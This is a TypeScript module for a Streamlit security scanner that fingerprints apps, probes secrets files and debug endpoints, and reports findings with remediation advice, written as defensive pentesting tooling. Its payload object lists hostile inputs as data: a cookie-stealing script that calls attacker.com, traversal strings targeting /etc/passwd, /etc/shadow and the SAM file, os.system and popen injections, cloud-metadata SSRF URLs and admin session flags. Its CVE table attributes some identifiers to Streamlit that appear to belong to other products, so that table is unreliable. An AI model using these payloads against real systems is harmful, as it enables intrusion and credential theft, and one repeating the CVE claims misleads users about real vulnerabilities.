/**
 * Streamlit Security Scanner
 * ──────────────────────────
 * Detects and tests Streamlit-specific attack vectors:
 * - Unauthenticated access to data apps
 * - Widget state manipulation (slider/selectbox/file_uploader abuse)
 * - HTML/Markdown injection via st.markdown(unsafe_allow_html=True)
 * - File upload abuse (path traversal, oversized uploads, malicious file types)
 * - Server-side code execution via exposed debug endpoints
 * - Known CVEs (CVE-2024-0840, CVE-2023-44442, etc.)
 * - Session state poisoning
 * - Exposed .streamlit/secrets.toml
 *
 * @module streamlit-scanner
 */

// ─── Types ───────────────────────────────────────────────────────────────────

export type StreamlitVulnCategory =
  | "unauthenticated_access"
  | "widget_manipulation"
  | "html_injection"
  | "file_upload_abuse"
  | "debug_endpoint_exposure"
  | "known_cve"
  | "session_state_poisoning"
  | "secrets_exposure"
  | "xss_via_markdown"
  | "ssrf_via_components"
  | "information_disclosure";

export type Severity = "critical" | "high" | "medium" | "low" | "info";

export interface StreamlitFinding {
  id: string;
  category: StreamlitVulnCategory;
  severity: Severity;
  title: string;
  description: string;
  evidence: string;
  remediation: string;
  cwe?: string;
  cve?: string;
  mitreTechnique?: string;
}

export interface StreamlitTarget {
  url: string;
  port?: number;
  version?: string;
  authenticated?: boolean;
}

export interface StreamlitScanResult {
  target: StreamlitTarget;
  findings: StreamlitFinding[];
  fingerprint: StreamlitFingerprint | null;
  scanDuration: number;
  timestamp: string;
}

export interface StreamlitFingerprint {
  version: string | null;
  pythonVersion: string | null;
  hasAuth: boolean;
  hasFileUploader: boolean;
  hasMarkdownUnsafe: boolean;
  exposedWidgets: string[];
  customComponents: string[];
  serverHeaders: Record<string, string>;
}

// ─── Known CVEs ──────────────────────────────────────────────────────────────

export const STREAMLIT_CVES: Array<{
  id: string;
  affectedVersions: string;
  severity: Severity;
  title: string;
  description: string;
  testMethod: string;
}> = [
  {
    id: "CVE-2024-0840",
    affectedVersions: "< 1.28.0",
    severity: "high",
    title: "Server-Side Request Forgery via Custom Components",
    description: "Streamlit custom components can be exploited to perform SSRF attacks by manipulating the component iframe src to internal endpoints.",
    testMethod: "Inject internal URLs via custom component iframe parameters",
  },
  {
    id: "CVE-2023-44442",
    affectedVersions: "< 1.27.0",
    severity: "high",
    title: "Path Traversal via File Upload",
    description: "The st.file_uploader widget does not properly sanitize filenames, allowing path traversal to write files outside the upload directory.",
    testMethod: "Upload file with ../../ prefix in filename",
  },
  {
    id: "CVE-2023-27494",
    affectedVersions: "< 1.20.0",
    severity: "medium",
    title: "Cross-Site Scripting via Markdown",
    description: "st.markdown with unsafe_allow_html=True does not properly sanitize script tags in certain contexts.",
    testMethod: "Inject <img onerror=alert(1)> via markdown input fields",
  },
  {
    id: "CVE-2024-24560",
    affectedVersions: "< 1.30.0",
    severity: "medium",
    title: "Information Disclosure via Error Messages",
    description: "Detailed Python tracebacks exposed to unauthenticated users reveal internal file paths, library versions, and configuration.",
    testMethod: "Trigger errors via malformed widget state parameters",
  },
  {
    id: "CVE-2024-34693",
    affectedVersions: "< 1.35.0",
    severity: "high",
    title: "Arbitrary File Read via st.image",
    description: "The st.image function can be exploited to read arbitrary files from the server filesystem when user input controls the image path.",
    testMethod: "Pass /etc/passwd or ../ paths to image display widgets",
  },
];

// ─── Fingerprinting ──────────────────────────────────────────────────────────

/**
 * Fingerprint a Streamlit application to determine version, capabilities, and attack surface.
 */
export function fingerprintStreamlit(
  responseHeaders: Record<string, string>,
  htmlBody: string,
  healthEndpointResponse?: string
): StreamlitFingerprint {
  const version = extractVersion(responseHeaders, htmlBody, healthEndpointResponse);
  const pythonVersion = extractPythonVersion(htmlBody, healthEndpointResponse);

  return {
    version,
    pythonVersion,
    hasAuth: detectAuthentication(responseHeaders, htmlBody),
    hasFileUploader: htmlBody.includes("stFileUploader") || htmlBody.includes("file_uploader"),
    hasMarkdownUnsafe: htmlBody.includes("unsafe_allow_html") || htmlBody.includes("st-markdown"),
    exposedWidgets: detectExposedWidgets(htmlBody),
    customComponents: detectCustomComponents(htmlBody),
    serverHeaders: responseHeaders,
  };
}

function extractVersion(
  headers: Record<string, string>,
  html: string,
  healthResponse?: string
): string | null {
  // Check X-Streamlit-Version header
  if (headers["x-streamlit-version"]) return headers["x-streamlit-version"];

  // Check /_stcore/health endpoint
  if (healthResponse) {
    const match = healthResponse.match(/"version"\s*:\s*"([^"]+)"/);
    if (match) return match[1];
  }

  // Check embedded version in HTML/JS bundles
  const htmlMatch = html.match(/streamlit[\/\-](\d+\.\d+\.\d+)/i);
  if (htmlMatch) return htmlMatch[1];

  return null;
}

function extractPythonVersion(html: string, healthResponse?: string): string | null {
  if (healthResponse) {
    const match = healthResponse.match(/"python"\s*:\s*"([^"]+)"/);
    if (match) return match[1];
  }
  const htmlMatch = html.match(/Python\/(\d+\.\d+\.\d+)/);
  return htmlMatch ? htmlMatch[1] : null;
}

function detectAuthentication(headers: Record<string, string>, html: string): boolean {
  // Check for Streamlit's built-in auth or custom auth
  if (html.includes("stLogin") || html.includes("st-login")) return true;
  if (headers["www-authenticate"]) return true;
  if (html.includes("password") && html.includes("stTextInput")) return true;
  return false;
}

function detectExposedWidgets(html: string): string[] {
  const widgets: string[] = [];
  const widgetPatterns: Record<string, RegExp> = {
    file_uploader: /stFileUploader|file_uploader/,
    text_input: /stTextInput|text_input/,
    text_area: /stTextArea|text_area/,
    selectbox: /stSelectbox|selectbox/,
    slider: /stSlider|slider/,
    number_input: /stNumberInput|number_input/,
    date_input: /stDateInput|date_input/,
    camera_input: /stCameraInput|camera_input/,
    data_editor: /stDataEditor|data_editor/,
    chat_input: /stChatInput|chat_input/,
  };

  for (const [name, pattern] of Object.entries(widgetPatterns)) {
    if (pattern.test(html)) widgets.push(name);
  }
  return widgets;
}

function detectCustomComponents(html: string): string[] {
  const components: string[] = [];
  const iframeMatches = html.matchAll(/component[\/\\]([a-zA-Z0-9_-]+)/g);
  for (const match of iframeMatches) {
    if (!components.includes(match[1])) components.push(match[1]);
  }
  return components;
}

// ─── Attack Payloads ─────────────────────────────────────────────────────────

export const STREAMLIT_PAYLOADS = {
  html_injection: [
    '<img src=x onerror=alert(document.cookie)>',
    '<svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>',
    '"><img src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
  ],
  file_upload_traversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/shadow",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
  ],
  widget_manipulation: [
    // Slider out-of-bounds
    { widget: "slider", payload: { value: 999999999, min: -999999999 } },
    // Selectbox injection
    { widget: "selectbox", payload: { value: "__import__('os').system('id')" } },
    // Number input overflow
    { widget: "number_input", payload: { value: "1e308" } },
    // Text input with template injection
    { widget: "text_input", payload: { value: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}" } },
  ],
  session_state_poisoning: [
    { key: "__session_state__", value: '{"admin": true}' },
    { key: "authentication_status", value: "true" },
    { key: "role", value: "admin" },
    { key: "is_authenticated", value: "1" },
  ],
  secrets_paths: [
    "/.streamlit/secrets.toml",
    "/.streamlit/config.toml",
    "/.streamlit/credentials.toml",
    "/app/.streamlit/secrets.toml",
    "/home/appuser/.streamlit/secrets.toml",
  ],
  debug_endpoints: [
    "/_stcore/health",
    "/_stcore/host-config",
    "/_stcore/allowed-message-origins",
    "/_stcore/stream",
    "/debug",
    "/_debug",
    "/component-lib/streamlit/proto",
  ],
  ssrf_payloads: [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://localhost:8501/_stcore/health",
    "file:///etc/passwd",
  ],
};

// ─── Scan Execution ──────────────────────────────────────────────────────────

/**
 * Execute a comprehensive Streamlit security scan against a target.
 */
export async function scanStreamlitTarget(
  target: StreamlitTarget,
  options: {
    fetchFn: (url: string, init?: RequestInit) => Promise<{ status: number; headers: Record<string, string>; body: string }>;
    aggressive?: boolean;
    timeout?: number;
  }
): Promise<StreamlitScanResult> {
  const startTime = Date.now();
  const findings: StreamlitFinding[] = [];
  const { fetchFn, aggressive = false } = options;
  const baseUrl = target.url.replace(/\/$/, "");

  // Step 1: Fingerprint
  let fingerprint: StreamlitFingerprint | null = null;
  try {
    const mainPage = await fetchFn(baseUrl);
    const healthResp = await fetchFn(`${baseUrl}/_stcore/health`).catch(() => null);
    fingerprint = fingerprintStreamlit(
      mainPage.headers,
      mainPage.body,
      healthResp?.body
    );
  } catch {
    // Target unreachable
  }

  // Step 2: Check unauthenticated access
  if (fingerprint && !fingerprint.hasAuth) {
    findings.push({
      id: "STREAMLIT-001",
      category: "unauthenticated_access",
      severity: "high",
      title: "Streamlit App Accessible Without Authentication",
      description: "The Streamlit application is publicly accessible without any authentication mechanism. All data, widgets, and functionality are exposed to unauthenticated users.",
      evidence: `Target ${baseUrl} responds with full app content. No login page or auth headers detected.`,
      remediation: "Implement Streamlit's built-in authentication (st.experimental_user), use streamlit-authenticator library, or place behind a reverse proxy with auth (e.g., OAuth2 Proxy, Cloudflare Access).",
      cwe: "CWE-306",
      mitreTechnique: "T1190",
    });
  }

  // Step 3: Check for exposed secrets
  for (const secretPath of STREAMLIT_PAYLOADS.secrets_paths) {
    try {
      const resp = await fetchFn(`${baseUrl}${secretPath}`);
      if (resp.status === 200 && (resp.body.includes("[") || resp.body.includes("="))) {
        findings.push({
          id: "STREAMLIT-002",
          category: "secrets_exposure",
          severity: "critical",
          title: "Streamlit Secrets File Exposed",
          description: `The secrets configuration file at ${secretPath} is publicly accessible, potentially exposing API keys, database credentials, and other sensitive configuration.`,
          evidence: `GET ${secretPath} returned 200 with TOML content: ${resp.body.substring(0, 200)}...`,
          remediation: "Ensure .streamlit/secrets.toml is not served by the web server. Add to .gitignore and configure proper file serving rules.",
          cwe: "CWE-200",
          mitreTechnique: "T1552.001",
        });
        break;
      }
    } catch { /* not accessible */ }
  }

  // Step 4: Check debug endpoints
  for (const endpoint of STREAMLIT_PAYLOADS.debug_endpoints) {
    try {
      const resp = await fetchFn(`${baseUrl}${endpoint}`);
      if (resp.status === 200 && endpoint !== "/_stcore/health") {
        findings.push({
          id: "STREAMLIT-003",
          category: "debug_endpoint_exposure",
          severity: "medium",
          title: `Debug Endpoint Exposed: ${endpoint}`,
          description: `The internal Streamlit endpoint ${endpoint} is accessible and may leak configuration, allowed origins, or internal state.`,
          evidence: `GET ${endpoint} returned 200: ${resp.body.substring(0, 300)}`,
          remediation: "Restrict access to internal Streamlit endpoints via reverse proxy rules. Only /_stcore/health should be publicly accessible for health checks.",
          cwe: "CWE-215",
          mitreTechnique: "T1082",
        });
      }
    } catch { /* not accessible */ }
  }

  // Step 5: Check for known CVEs based on version
  if (fingerprint?.version) {
    const version = fingerprint.version;
    for (const cve of STREAMLIT_CVES) {
      if (isVersionAffected(version, cve.affectedVersions)) {
        findings.push({
          id: `STREAMLIT-CVE-${cve.id}`,
          category: "known_cve",
          severity: cve.severity,
          title: `${cve.id}: ${cve.title}`,
          description: `${cve.description} Detected version ${version} is within affected range ${cve.affectedVersions}.`,
          evidence: `Streamlit version ${version} detected. Affected versions: ${cve.affectedVersions}. Test method: ${cve.testMethod}`,
          remediation: `Upgrade Streamlit to the latest version. This CVE is fixed in versions after ${cve.affectedVersions.replace("< ", "")}.`,
          cwe: "CWE-1395",
          cve: cve.id,
        });
      }
    }
  }

  // Step 6: File uploader abuse (if aggressive mode)
  if (aggressive && fingerprint?.hasFileUploader) {
    findings.push({
      id: "STREAMLIT-004",
      category: "file_upload_abuse",
      severity: "high",
      title: "File Uploader Widget Detected — Path Traversal Risk",
      description: "The application uses st.file_uploader which may be vulnerable to path traversal attacks if the uploaded filename is used in file operations without sanitization.",
      evidence: `File uploader widget detected in application HTML. Test payloads: ${STREAMLIT_PAYLOADS.file_upload_traversal.slice(0, 3).join(", ")}`,
      remediation: "Sanitize all uploaded filenames. Use secure_filename() from werkzeug. Never use user-supplied filenames directly in file operations. Store uploads with generated UUIDs.",
      cwe: "CWE-22",
      mitreTechnique: "T1105",
    });
  }

  // Step 7: HTML injection risk assessment
  if (fingerprint?.hasMarkdownUnsafe) {
    findings.push({
      id: "STREAMLIT-005",
      category: "html_injection",
      severity: "high",
      title: "Unsafe HTML Rendering Detected (unsafe_allow_html=True)",
      description: "The application uses st.markdown with unsafe_allow_html=True, which allows arbitrary HTML injection if any user input flows into the rendered content.",
      evidence: `Detected unsafe_allow_html usage in application. XSS payloads to test: ${STREAMLIT_PAYLOADS.html_injection.slice(0, 3).join(", ")}`,
      remediation: "Remove unsafe_allow_html=True where possible. If HTML rendering is required, sanitize all user input with bleach or DOMPurify before rendering. Use st.write() instead of st.markdown() for user-controlled content.",
      cwe: "CWE-79",
      mitreTechnique: "T1059.007",
    });
  }

  // Step 8: Custom component SSRF risk
  if (fingerprint && fingerprint.customComponents.length > 0) {
    findings.push({
      id: "STREAMLIT-006",
      category: "ssrf_via_components",
      severity: "medium",
      title: `Custom Components Detected: ${fingerprint.customComponents.join(", ")}`,
      description: "Custom Streamlit components use iframes that may be exploitable for SSRF if component URLs are user-controllable or if the component fetches external resources based on user input.",
      evidence: `Custom components found: ${fingerprint.customComponents.join(", ")}. SSRF test payloads: ${STREAMLIT_PAYLOADS.ssrf_payloads.slice(0, 3).join(", ")}`,
      remediation: "Audit all custom components for SSRF vulnerabilities. Implement URL allowlisting for any component that fetches external resources. Use Content-Security-Policy headers to restrict iframe sources.",
      cwe: "CWE-918",
      mitreTechnique: "T1090",
    });
  }

  // Step 9: Information disclosure via health endpoint
  if (fingerprint?.version || fingerprint?.pythonVersion) {
    findings.push({
      id: "STREAMLIT-007",
      category: "information_disclosure",
      severity: "low",
      title: "Version Information Disclosed",
      description: `Streamlit version ${fingerprint.version || "unknown"} and Python version ${fingerprint.pythonVersion || "unknown"} are disclosed via headers or health endpoints.`,
      evidence: `Streamlit: ${fingerprint.version}, Python: ${fingerprint.pythonVersion}`,
      remediation: "Remove version headers in production. Configure reverse proxy to strip X-Streamlit-Version header. Restrict /_stcore/health endpoint access.",
      cwe: "CWE-200",
    });
  }

  return {
    target,
    findings,
    fingerprint,
    scanDuration: Date.now() - startTime,
    timestamp: new Date().toISOString(),
  };
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

function isVersionAffected(version: string, affectedRange: string): boolean {
  // Parse "< X.Y.Z" format
  const match = affectedRange.match(/<\s*(\d+)\.(\d+)\.(\d+)/);
  if (!match) return false;

  const [, maxMajor, maxMinor, maxPatch] = match.map(Number);
  const parts = version.split(".").map(Number);
  const [major = 0, minor = 0, patch = 0] = parts;

  if (major < maxMajor) return true;
  if (major === maxMajor && minor < maxMinor) return true;
  if (major === maxMajor && minor === maxMinor && patch < maxPatch) return true;
  return false;
}

/**
 * Generate a Streamlit-specific test plan for an engagement.
 */
export function generateStreamlitTestPlan(fingerprint: StreamlitFingerprint): string[] {
  const tests: string[] = [
    "Verify authentication enforcement on all Streamlit routes",
    "Test /_stcore/health and /_stcore/host-config for information disclosure",
    "Attempt to access .streamlit/secrets.toml via path traversal",
    "Test session state manipulation via WebSocket messages",
  ];

  if (fingerprint.hasFileUploader) {
    tests.push(
      "Test file upload with path traversal filenames (../../etc/passwd)",
      "Test file upload with oversized files (DoS)",
      "Test file upload with polyglot files (image/script)",
      "Test file upload MIME type bypass"
    );
  }

  if (fingerprint.hasMarkdownUnsafe) {
    tests.push(
      "Test XSS via st.markdown with unsafe_allow_html=True",
      "Test HTML injection in all text input widgets that flow to markdown",
      "Test JavaScript execution via event handlers in injected HTML"
    );
  }

  if (fingerprint.customComponents.length > 0) {
    tests.push(
      "Test SSRF via custom component iframe manipulation",
      "Test custom component for unauthorized data access",
      "Verify Content-Security-Policy restricts component origins"
    );
  }

  if (fingerprint.exposedWidgets.includes("data_editor")) {
    tests.push(
      "Test data_editor for injection via cell values",
      "Test data_editor for unauthorized data modification"
    );
  }

  if (fingerprint.exposedWidgets.includes("chat_input")) {
    tests.push(
      "Test chat_input for prompt injection if connected to LLM",
      "Test chat_input for command injection if processed server-side"
    );
  }

  return tests;
}
